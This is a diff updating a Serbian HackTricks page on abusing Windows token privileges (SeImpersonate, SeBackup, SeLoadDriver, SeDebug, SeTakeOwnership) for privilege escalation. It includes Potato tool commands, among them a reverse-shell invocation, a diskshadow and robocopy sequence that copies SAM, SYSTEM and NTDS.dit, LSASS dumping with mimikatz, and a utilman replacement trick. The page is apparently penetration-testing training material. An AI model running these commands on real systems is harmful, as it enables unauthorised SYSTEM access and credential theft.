@@ -1,8 +1,8 @@
-# Zloupotreba tokena
+# Abusing Tokens
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Tokeni
+## Tokens
 
 Ako **ne znate šta su Windows Access Tokens** pročitajte ovu stranicu pre nego što nastavite:
 
@@ -11,13 +11,23 @@ Ako **ne znate šta su Windows Access Tokens** pročitajte ovu stranicu pre nego
 access-tokens.md
 {{#endref}}
 
-**Možda možete eskalirati privilegije zloupotrebom tokena koje već posedujete**
+**Možda ćete moći da eskalirate privilegije zloupotrebom tokena koje već imate**
 
 ### SeImpersonatePrivilege
 
-Ovo je privilegija koju poseduje proces i koja omogućava impersonaciju (ali ne i kreiranje) bilo kog tokena, pod uslovom da se dobije handle na njega. Privilegovan token može se pribaviti iz Windows servisa (DCOM) tako što se natera da izvrši NTLM autentikaciju prema exploit-u, čime se omogućava izvršavanje procesa sa SYSTEM privilegijama. Ova ranjivost se može iskoristiti korišćenjem različitih alata, kao što su [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (zahteva da winrm bude onemogućen), [SweetPotato](https://github.com/CCob/SweetPotato) i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).
+Ovo je privilegija koju poseduje bilo koji proces i omogućava impersonation (ali ne i kreiranje) bilo kog tokena, pod uslovom da se može dobiti handle do njega. Privilegovani token može se dobiti od Windows service (DCOM) tako što se navede da izvrši NTLM authentication nad exploitom, čime se naknadno omogućava izvršavanje procesa sa SYSTEM privilegijama. Ova ranjivost može se iskoristiti pomoću različitih alata, kao što su [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (što zahteva da winrm bude disabled), [SweetPotato](https://github.com/CCob/SweetPotato), i [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).
 
+Modern operator notes:
 
+- **JuicyPotato is legacy**: na Windows 10 1809+/Server 2019+, preferirajte **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ili **PrintSpoofer** u zavisnosti od toga koja RPC/COM površina je i dalje dostupna.
+- Ako ste kompromitovali service koji radi kao **`LOCAL SERVICE`** ili **`NETWORK SERVICE`** i `whoami /priv` prikazuje **filtered token** bez `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, prvo vratite **default privilege set** tog accounta (na primer pomoću **FullPowers**) i zatim ponovo pokušajte potato family.
+- Neki noviji forks su pogodniji za operatera od originalnih alata. Na primer, **SigmaPotato** dodaje reflection/in-memory execution i modernu Windows kompatibilnost, dok **PrintNotifyPotato** zloupotrebljava PrintNotify COM service i često je koristan kada je klasični Spooler path onemogućen.
+```cmd
+FullPowers.exe -c "cmd /c whoami /priv" -z
+GodPotato.exe -cmd "cmd /c whoami"
+SigmaPotato.exe --revshell <ip> <port>
+PrintNotifyPotato.exe whoami
+```
 {{#ref}}
 roguepotato-and-printspoofer.md
 {{#endref}}
@@ -29,23 +39,36 @@ juicypotato.md
 
 ### SeAssignPrimaryPrivilege
 
-Veoma je slična **SeImpersonatePrivilege**, koristiće **isti metod** da dobije privilegovan token.\
-Zatim, ova privilegija omogućava **dodelu primary tokena** novom/suspendovanom procesu. Sa privilegovanim impersonation tokenom možete izvesti derivaciju primary tokena (DuplicateTokenEx).\
-Sa tokenom možete kreirati **novi proces** pomoću 'CreateProcessAsUser' ili kreirati proces u suspendovanom stanju i **postaviti token** (općenito, ne možete menjati primary token već pokrenutog procesa).
+Veoma je slično **SeImpersonatePrivilege**, koristiće **isti metod** da dobije privileged token.\
+Zatim, ova privilegija omogućava da **dodeli primary token** novom/suspendovanom procesu. Sa privileged impersonation tokenom možete derivisati primary token (DuplicateTokenEx).\
+Sa tokenom, možete kreirati **novi process** pomoću 'CreateProcessAsUser' ili kreirati process suspendovan i **postaviti token** (uopšteno, ne možete menjati primary token procesa koji je već u radu).
 
 ### SeTcbPrivilege
 
-Ako imate omogućenu ovu privilegiju možete koristiti **KERB_S4U_LOGON** da dobijete **impersonation token** za bilo kog drugog korisnika bez poznavanja kredencijala, **dodati proizvoljnu grupu** (admins) u token, postaviti **integrity level** tokena na "**medium**", i dodeliti taj token **trenutnoj niti** (SetThreadToken).
+Ako imate omogućen ovaj token, možete koristiti **KERB_S4U_LOGON** da dobijete **impersonation token** za bilo kog drugog korisnika bez znanja kredencijala, **dodati proizvoljnu grupu** (admins) u token, postaviti **integrity level** tokena na "**medium**", i dodeliti ovaj token **trenutnoj thread** (SetThreadToken).
 
 ### SeBackupPrivilege
 
-Ova privilegija uzrokuje da sistem **dodeli sva prava za čitanje** za bilo koji fajl (ograničeno na operacije čitanja). Koristi se za **čitavanje password hash-eva lokalnih Administrator** naloga iz registra, nakon čega se alati poput "**psexec**" ili "**wmiexec**" mogu koristiti sa hash-om (Pass-the-Hash tehnika). Međutim, ova tehnika ne uspeva u dva slučaja: kada je Local Administrator nalog onemogućen, ili kada postoji politika koja uklanja administrativna prava od Local Administrators koji se povezuju na daljinu.\
-Ovu privilegiju možete **zloupotrebiti** sa:
+Ova privilegija uzrokuje da sistem **odobri sav read access** bilo kojoj datoteci (ograničeno na operacije čitanja). Koristi se za **čitanje password hashes lokalnih Administrator** naloga iz registrija, nakon čega se alati poput "**psexec**" ili "**wmiexec**" mogu koristiti sa hashom (Pass-the-Hash tehnika). Međutim, ova tehnika ne uspeva u dva slučaja: kada je Local Administrator nalog onemogućen, ili kada postoji policy koji uklanja administrative rights sa Local Administrators koji se povezuju remotely.\
+U praksi, najpouzdaniji ugrađeni workflow je obično **VSS + `robocopy /b`**: kreirajte/izložite shadow copy, zatim kopirajte `SAM`/`SYSTEM` ili `NTDS.dit` u **backup mode**, što zaobilazi file ACLs.
+```cmd
+:: shadow.txt
+set context persistent nowriters
+add volume c: alias tk
+create
+expose %tk% z:
+
+:: then copy sensitive files from the snapshot
+diskshadow /s shadow.txt
+robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
+robocopy /b z:\Windows\NTDS C:\temp ntds.dit
+```
+Možete **zloupotrebiti ovu privilegiju** uz:
 
 - [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
 - [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
 - prateći **IppSec** u [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
-- Ili kao što je objašnjeno u sekciji **escalating privileges with Backup Operators** od:
+- Ili kao što je objašnjeno u odeljku **escalating privileges with Backup Operators** u:
 
 
 {{#ref}}
@@ -54,32 +77,34 @@ Ovu privilegiju možete **zloupotrebiti** sa:
 
 ### SeRestorePrivilege
 
-Ova privilegija daje dozvolu za **write access** bilo kojem sistemskom fajlu, bez obzira na Access Control List (ACL) fajla. Otvara mnoge mogućnosti za eskalaciju, uključujući mogućnost **izmenе servisa**, izvođenje DLL Hijacking-a i postavljanje **debuggera** preko Image File Execution Options, među raznim drugim tehnikama.
+Dozvola za **write access** nad bilo kojim sistemskim fajlom, bez obzira na Access Control List (ACL) fajla, obezbeđena je ovom privilegijom. Otvara brojne mogućnosti za eskalaciju, uključujući mogućnost da se **modify services**, izvrši DLL Hijacking, i postave **debuggers** preko Image File Execution Options, između raznih drugih tehnika.
 
 ### SeCreateTokenPrivilege
 
-SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik ima mogućnost impersonacije tokena, ali i u odsustvu SeImpersonatePrivilege. Ova mogućnost zavisi od sposobnosti da se impersonira token koji predstavlja istog korisnika i čiji integrity level nije viši od integrity level-a trenutnog procesa.
+SeCreateTokenPrivilege je moćna dozvola, naročito korisna kada korisnik ima mogućnost da impersonate token-e, ali i u odsustvu SeImpersonatePrivilege. Ova sposobnost zavisi od mogućnosti da se impersonate token koji predstavlja istog korisnika i čiji integrity level ne prelazi onaj trenutnog procesa.
 
 **Ključne tačke:**
 
-- **Impersonacija bez SeImpersonatePrivilege:** Moguće je iskoristiti SeCreateTokenPrivilege za EoP impersonirajući tokene pod određenim uslovima.
-- **Uslovi za impersonaciju tokena:** Uspešna impersonacija zahteva da cilj token pripada istom korisniku i da ima integrity level manji ili jednak integrity level-u procesa koji pokušava impersonaciju.
-- **Kreiranje i modifikacija impersonation tokena:** Korisnici mogu kreirati impersonation token i poboljšati ga dodavanjem SID-a privilegovane grupe (Security Identifier).
+- **Impersonation without SeImpersonatePrivilege:** Moguće je iskoristiti SeCreateTokenPrivilege za EoP pod određenim uslovima.
+- **Conditions for Token Impersonation:** Uspešan impersonation zahteva da ciljani token pripada istom korisniku i da ima integrity level koji je manji ili jednak integrity level-u procesa koji pokušava impersonation.
+- **Creation and Modification of Impersonation Tokens:** Korisnici mogu da kreiraju impersonation token i da ga unaprede dodavanjem SID-a (Security Identifier) privilegovane grupe.
 
 ### SeLoadDriverPrivilege
 
-Ova privilegija omogućava **učitavanje i izbacivanje device driver-a** kreiranjem unosa u registru sa specifičnim vrednostima za `ImagePath` i `Type`. Pošto je direktan write pristup `HKLM` (HKEY_LOCAL_MACHINE) ograničen, mora se koristiti `HKCU` (HKEY_CURRENT_USER). Međutim, da bi kernel prepoznao `HKCU` za konfiguraciju drajvera, mora se slediti specifičan put.
+Ova privilegija omogućava da se **load and unload device drivers** uz kreiranje registry unosa sa specifičnim vrednostima za `ImagePath` i `Type`. Pošto je direktan write access ka `HKLM` (HKEY_LOCAL_MACHINE) ograničen, umesto toga mora da se koristi `HKCU` (HKEY_CURRENT_USER). Međutim, da bi `HKCU` bio prepoznat od strane kernela za konfiguraciju driver-a, mora se pratiti specifična putanja.
 
-Taj put je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU` mora se kreirati ceo ovaj put i postaviti dve vrednosti:
+Modern offensive use je obično **BYOVD** (bring your own vulnerable driver): učitajte **signed but vulnerable** kernel driver i zatim koristite njegove IOCTL-ove da onemogućite zaštite ili pređete na kernel code execution. Imajte na umu da na novijim Windows 11/Server buildovima **Microsoft vulnerable driver blocklist** i/ili **HVCI/Memory Integrity** često prekidaju starije javne lance, tako da klasični primeri tipa `szkg64.sys` više nisu univerzalno pouzdani.
 
-- `ImagePath`, koji je putanja do binarnog fajla koji će se izvršiti
+Ova putanja je `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, gde je `<RID>` Relative Identifier trenutnog korisnika. Unutar `HKCU`, ova cela putanja mora da se kreira, a dve vrednosti moraju da se postave:
+
+- `ImagePath`, koja je putanja do binarnog fajla koji će se izvršiti
 - `Type`, sa vrednošću `SERVICE_KERNEL_DRIVER` (`0x00000001`).
 
-**Koraci koje treba slediti:**
+**Koraci koje treba pratiti:**
 
-1. Pristupite `HKCU` umesto `HKLM` zbog ograničenog write pristupa.
-2. Kreirajte put `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
-3. Postavite `ImagePath` na putanju izvršnog binarnog fajla.
+1. Pristupite `HKCU` umesto `HKLM` zbog ograničenog write access-a.
+2. Kreirajte putanju `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` unutar `HKCU`, gde `<RID>` predstavlja Relative Identifier trenutnog korisnika.
+3. Postavite `ImagePath` na putanju izvršavanja binarnog fajla.
 4. Dodelite `Type` kao `SERVICE_KERNEL_DRIVER` (`0x00000001`).
 ```python
 # Example Python code to set the registry values
@@ -92,11 +117,11 @@ reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
 reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
 reg.CloseKey(key)
 ```
-Više načina za zloupotrebu ove privilegije u [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)
+Još načina da se zloupotrebi ovaj privilege u [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)
 
 ### SeTakeOwnershipPrivilege
 
-Ovo je slično **SeRestorePrivilege**. Njegova primarna funkcija omogućava procesu da **preuzme vlasništvo nad objektom**, zaobilaženjem zahteva za eksplicitnim diskrecionim pristupom putem dodeljivanja WRITE_OWNER prava pristupa. Postupak podrazumeva prvo obezbeđivanje vlasništva nad ciljnim registarskim ključem radi upisa, a zatim izmenu DACL-a kako bi se omogućile operacije upisa.
+Ovo je slično kao **SeRestorePrivilege**. Njegova primarna funkcija omogućava procesu da **preuzme ownership nad objektom**, zaobilazeći zahtev za eksplicitnim discretionary access putem dodele WRITE_OWNER access rights. Proces podrazumeva prvo preuzimanje ownership nad željenim registry key-jem radi pisanja, a zatim izmenu DACL-a da bi se omogućile write operacije.
 ```bash
 takeown /f 'C:\some\file.txt' #Now the file is owned by you
 icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
@@ -114,11 +139,13 @@ c:\inetpub\wwwwroot\web.config
 ```
 ### SeDebugPrivilege
 
-Ova privilegija omogućava **debug other processes**, uključujući čitanje i pisanje u memoriju. Razne strategije za **memory injection**, koje mogu zaobići većinu antivirus i host intrusion prevention rešenja, mogu se koristiti sa ovom privilegijom.
+Ova privilegija omogućava da **debug other processes**, uključujući čitanje i upis u memoriju. Mogu se koristiti različite strategije za memory injection, sposobne da zaobiđu većinu antivirus i host intrusion prevention rešenja, uz ovu privilegiju.
+
+Na modernom Windows-u, imajte na umu da je `SeDebugPrivilege` obično dovoljan da otvori **non-protected SYSTEM procese** i duplira njihove tokene, ali nije garancija da možete da dirate **LSASS**. Ako je **RunAsPPL / LSA Protection** uključen, non-protected procesi ne mogu da čitaju ili injektuju u LSASS čak i ako je `SeDebugPrivilege` prisutan. U tom slučaju, ukradite token iz drugog non-PPL SYSTEM procesa, ili ga lančajte sa PPL bypass/BYOVD umesto da pretpostavljate da će `procdump` raditi. Za potpuni primer kopiranja tokena uz `SeDebugPrivilege` + `SeImpersonatePrivilege`, pogledajte [ovu stranicu](sedebug-+-seimpersonate-copy-token.md).
 
 #### Dump memory
 
-Možete koristiti [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) da **capture the memory of a process**. Konkretno, ovo se može primeniti na proces **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je odgovoran za čuvanje korisničkih kredencijala nakon što se korisnik uspešno prijavi na sistem.
+Možete koristiti [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) iz [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) da **capture the memory of a process**. Konkretno, ovo može da se primeni na proces **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, koji je zadužen za čuvanje korisničkih kredencijala nakon što se korisnik uspešno prijavi na sistem.
 
 Zatim možete učitati ovaj dump u mimikatz da biste dobili lozinke:
 ```
@@ -140,48 +167,51 @@ import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<c
 ```
 ### SeManageVolumePrivilege
 
-Ovo pravo (Perform volume maintenance tasks) omogućava otvaranje raw volume device handles (npr. \\.\C:) za direktan disk I/O koji zaobilazi NTFS ACLs. Pomoću njega možete kopirati bajtove bilo koje datoteke na volumenu čitajući osnovne blokove, što omogućava proizvoljno čitanje datoteka osetljivog sadržaja (npr. privatni ključevi mašine u %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Posebno je uticajan na CA serverima gde exfiltrating CA private key omogućava falsifikovanje Golden Certificate za impersonaciju bilo kog principal-a.
+Ovo pravo (Perform volume maintenance tasks) omogućava otvaranje raw volume device handle-ova (npr., \\.\C:) za direktan disk I/O koji zaobilazi NTFS ACL-ove. Sa njim možete kopirati bajtove bilo kog fajla na volume-u tako što čitate osnovne blokove, što omogućava arbitrary file read osetljivih podataka (npr. machine private keys u %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS preko VSS). Posebno je značajno na CA serverima, gde exfiltrating CA private key omogućava pravljenje Golden Certificate-a za impersonate bilo kog principal-a.
 
-See detailed techniques and mitigations:
+Pogledajte detaljne tehnike i mitigations:
 
 {{#ref}}
 semanagevolume-perform-volume-maintenance-tasks.md
-{{#endref}}
+{{endref}}
 
-## Provera privilegija
+## Check privileges
 ```
 whoami /priv
 ```
-**tokens koji se pojavljuju kao Disabled** mogu biti omogućeni; zapravo možete zloupotrebiti _Enabled_ i _Disabled_ tokens.
+**Tokeni koji se prikazuju kao Disabled** obično mogu da se omoguće, tako da često možete zloupotrebiti i _Enabled_ i _Disabled_ privilegije.
 
-### Omogući sve tokens
+### Omogući sve tokene
 
-Ako imate tokens koji su Disabled, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokens:
+Ako imate disabled privilegije, možete koristiti skriptu [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) da omogućite sve tokene:
 ```bash
 .\EnableAllTokenPrivs.ps1
 whoami /priv
 ```
-Ili **skripta** ugrađena u ovaj [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).
+Ili **script** ugrađen u ovom [**postu**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).
 
 ## Tabela
 
-Kompletan cheatsheet privilegija tokena na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), sažetak ispod će navesti samo direktne načine za iskorišćavanje privilegije da se dobije administratorska sesija ili čitanje osetljivih fajlova.
+Potpuni token privileges cheatsheet je na [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), a sažetak ispod će navesti samo direktne načine da se iskoristi privilege za dobijanje admin sesije ili čitanje osetljivih fajlova.
 
-| Privilege                  | Uticaj      | Alat                    | Put izvršavanja                                                                                                                                                                                                                                                                                                                                     | Napomene                                                                                                                                                                                                                                                                                                                        |
-| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"Omogućava korisniku da imitira tokene i izvrši privesc na NT System koristeći alate kao što su potato.exe, rottenpotato.exe i juicypotato.exe"_                                                                                                                                                                                                      | Hvala [Aurélien Chalot](https://twitter.com/Defte_) za ažuriranje. Pokušaću uskoro da to preformulišem u nešto više receptnog stila.                                                                                                                                                                                         |
-| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Pročitajte osetljive fajlove pomoću `robocopy /b`                                                                                                                                                                                                                                                                                                  | <p>- Može biti interesantnije ako možete pročitati %WINDIR%\MEMORY.DMP<br><br>- <code>SeBackupPrivilege</code> (i robocopy) nije od pomoći kada su u pitanju otvoreni fajlovi.<br><br>- Robocopy zahteva i SeBackup i SeRestore da bi radio sa /b parametrom.</p>                                                                      |
-| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Napravite proizvoljan token uključujući lokalna admin prava pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                |
-| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplirajte token `lsass.exe`.                                                                                                                                                                                                                                                                                                                      | Skripta se može naći na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)                                                                                                                                                                                                         |
-| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Učitajte problematični kernel driver kao što je <code>szkg64.sys</code><br>2. Iskoristite ranjivost drajvera<br><br>Alternativno, privilegija se može koristiti za uklanjanje security-related drajvera pomoću builtin komande <code>ftlMC</code>, npr.: <code>fltMC sysmondrv</code></p>                                                                           | <p>1. Ranljivost <code>szkg64</code> je navedena kao <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732">CVE-2018-15732</a><br>2. <code>szkg64</code> <a href="https://www.greyhathacker.net/?p=1025">exploit code</a> je kreirao <a href="https://twitter.com/parvezghh">Parvez Anwar</a></p> |
-| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokrenite PowerShell/ISE sa prisutnom SeRestore privilegijom.<br>2. Omogućite privilegiju pomoću <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenujte utilman.exe u utilman.old<br>4. Preimenujte cmd.exe u utilman.exe<br>5. Zaključajte konzolu i pritisnite Win+U</p> | <p>Napad može biti detektovan od strane nekog AV softvera.</p><p>Alternativna metoda se oslanja na zamenu binarnih fajlova servisa koji su smešteni u "Program Files" koristeći istu privilegiju</p>                                                                                                                                                            |
-| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icalcs.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenujte cmd.exe u utilman.exe<br>4. Zaključajte konzolu i pritisnite Win+U</p>                                                                                                                                       | <p>Napad može biti detektovan od strane nekog AV softvera.</p><p>Alternativna metoda se oslanja na zamenu binarnih fajlova servisa koji su smešteni u "Program Files" koristeći istu privilegiju.</p>                                                                                                                                                           |
-| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulišite tokenima da uključe lokalna admin prava. Možda zahteva SeImpersonate.</p><p>Treba potvrditi.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |
+| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
+| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Hvala [Aurélien Chalot](https://twitter.com/Defte_) na ažuriranju. Pokušaću uskoro da to preformulišem u nešto više nalik receptu.                                                                                                                                                                                            |
+| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Čitaj osetljive fajlove sa `robocopy /b` ili namenskim SeBackup-aware copy helperima.                                                                                                                                                                                                                                                               | <p>- Odlično za `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, a ponekad i `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` je praktičan, ali namenski SeBackup cmdlets/APIs su često fleksibilniji za zaključane/otvorene fajlove.</p>                                                                                                   |
+| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Kreiraj proizvoljan token uključujući lokalna admin prava pomoću `NtCreateToken`.                                                                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                                                                                                |
+| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Dupliraj **non-PPL** SYSTEM token ili dumpuj memoriju iz procesa koji nije zaštićen.                                                                                                                                                                                                                                                                 | <p>LSASS dumping je obično blokiran ako je uključen RunAsPPL/LSA Protection.</p><p>Script se može naći na [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
+| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Koristi **Potato family** / named-pipe impersonation da pokreneš SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, itd.).                                                                                                                                                                                    | <p>Najpraktičnije iz service accounts kao što su IIS APPPOOL, MSSQL, scheduled tasks, ili bilo kog konteksta koji već poseduje `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
+| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Učitaj potpisan ali ranjiv kernel driver (BYOVD)<br>2. Koristi driverove IOCTLs da dobiješ kernel R/W, onemogućiš security tooling, ili eskaliraš do SYSTEM<br><br>Alternativno, privilege se može koristiti za unloading security-related drivera sa <code>fltMC</code> builtin command, tj. <code>fltMC sysmondrv</code></p>                     | <p>Stariji public driveri kao što je <code>szkg64.sys</code> su sve češće blokirani na modernom Windows-u od strane vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
+| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Pokreni PowerShell/ISE sa prisutnim SeRestore privilege.<br>2. Omogući privilege sa <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Preimenuj utilman.exe u utilman.old<br>4. Preimenuj cmd.exe u utilman.exe<br>5. Zaključaj konzolu i pritisni Win+U</p> | <p>Napad može biti detektovan od strane nekog AV software-a.</p><p>Alternativna metoda se oslanja na zamenu service binary-ja sačuvanih u "Program Files" koristeći isti privilege</p>                                                                                                                                                            |
+| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Preimenuj cmd.exe u utilman.exe<br>4. Zaključaj konzolu i pritisni Win+U</p>                                                                                                                                       | <p>Napad može biti detektovan od strane nekog AV software-a.</p><p>Alternativna metoda se oslanja na zamenu service binary-ja sačuvanih u "Program Files" koristeći isti privilege.</p>                                                                                                                                                           |
+| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuliši tokenima tako da lokalna admin prava budu uključena. Možda zahteva SeImpersonate.</p><p>Za proveru.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |
 
-## Referenca
+## References
 
-- Pogledajte ovu tabelu koja definiše Windows tokene: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
-- Pogledajte [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) o privesc koristeći tokene.
+- Pogledaj ovu tabelu koja definiše Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
+- Pogledaj [**ovaj paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) o privesc sa tokenima.
+- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
+- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
 - Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
 - 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html
 
